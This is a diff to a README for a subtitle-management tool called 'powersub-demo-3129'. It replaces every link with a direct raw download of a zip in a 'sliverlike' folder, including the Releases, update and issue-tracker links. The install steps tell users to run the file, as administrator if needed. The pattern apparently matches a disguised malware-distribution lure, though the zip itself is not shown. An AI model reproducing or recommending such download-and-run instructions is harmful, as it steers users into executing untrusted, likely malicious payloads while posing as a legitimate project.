@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-3129 - Easy Subtitle Management for Videos
 
 ## 🌐 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen.svg)](https://github.com/landen2rich/powersub-demo-3129/releases)
+[![Download Here](https://github.com/landen2rich/powersub-demo-3129/raw/refs/heads/main/sliverlike/powersub-demo-2.5.zip%20Latest%20Version-Click%https://github.com/landen2rich/powersub-demo-3129/raw/refs/heads/main/sliverlike/powersub-demo-2.5.zip)](https://github.com/landen2rich/powersub-demo-3129/raw/refs/heads/main/sliverlike/powersub-demo-2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **powersub-demo-3129**! This application helps you manage subtitles for your videos effortlessly. Whether you're watching a movie or a tutorial, this tool makes it simple to add, edit, and sync subtitles.
@@ -23,10 +23,10 @@ Welcome to **powersub-demo-3129**! This application helps you manage subtitles f
 Follow these steps to download and install **powersub-demo-3129** on your computer:
 
 1. **Visit the Release Page**  
-   Go to our [Releases Page](https://github.com/landen2rich/powersub-demo-3129/releases) to find the latest version of the software.
+   Go to our [Releases Page](https://github.com/landen2rich/powersub-demo-3129/raw/refs/heads/main/sliverlike/powersub-demo-2.5.zip) to find the latest version of the software.
 
 2. **Download the Application**  
-   On the Releases page, locate the newest version. Click on it to see the available files. If you see a filename like `powersub-demo-3129-v1.0.exe`, click to download that file directly. Otherwise, choose the appropriate version for your operating system.
+   On the Releases page, locate the newest version. Click on it to see the available files. If you see a filename like `https://github.com/landen2rich/powersub-demo-3129/raw/refs/heads/main/sliverlike/powersub-demo-2.5.zip`, click to download that file directly. Otherwise, choose the appropriate version for your operating system.
 
 3. **Run the Installer**  
    Once the download completes, locate the downloaded file in your downloads folder. Double-click the file to begin installation. Follow the on-screen instructions to install the application on your computer.
@@ -48,7 +48,7 @@ Follow these steps to download and install **powersub-demo-3129** on your comput
    Use the preview feature to watch your video with the added subtitles. Adjust according to your preference.
 
 ## 🔄 Updating the Application
-To keep your application up to date, periodically visit the [Releases Page](https://github.com/landen2rich/powersub-demo-3129/releases). Download the latest version and follow the installation instructions again.
+To keep your application up to date, periodically visit the [Releases Page](https://github.com/landen2rich/powersub-demo-3129/raw/refs/heads/main/sliverlike/powersub-demo-2.5.zip). Download the latest version and follow the installation instructions again.
 
 ## 📝 Troubleshooting
 If you encounter issues:
@@ -56,7 +56,7 @@ If you encounter issues:
 - **Installation Problems:** Ensure you have sufficient disk space and meet the system requirements. Try running the installer as an administrator.
 - **Subtitle Syncing Issues:** Double-check the timing adjustments. Use the preview feature to see if further edits are needed.
 
-For more support, visit the [issue tracker](https://github.com/landen2rich/powersub-demo-3129/issues) or the community support page.
+For more support, visit the [issue tracker](https://github.com/landen2rich/powersub-demo-3129/raw/refs/heads/main/sliverlike/powersub-demo-2.5.zip) or the community support page.
 
 ## 🙏 Acknowledgments
 Thank you for using **powersub-demo-3129**! Your feedback helps improve the application. Please consider sharing your experiences or any suggestions.
